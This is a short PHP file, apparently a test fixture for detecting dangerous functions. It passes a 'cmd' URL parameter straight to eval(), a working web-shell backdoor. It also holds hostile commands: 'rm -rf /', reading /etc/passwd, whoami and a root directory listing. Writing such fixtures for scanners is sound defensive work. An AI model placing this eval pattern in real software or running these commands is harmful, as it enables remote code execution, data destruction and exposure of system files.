<?php

declare(strict_types=1);

// This script contains dangerous functions for testing
$input = $_GET['cmd'];
eval($input);
exec('rm -rf /');
system('whoami');
shell_exec('cat /etc/passwd');
passthru('ls -la /');
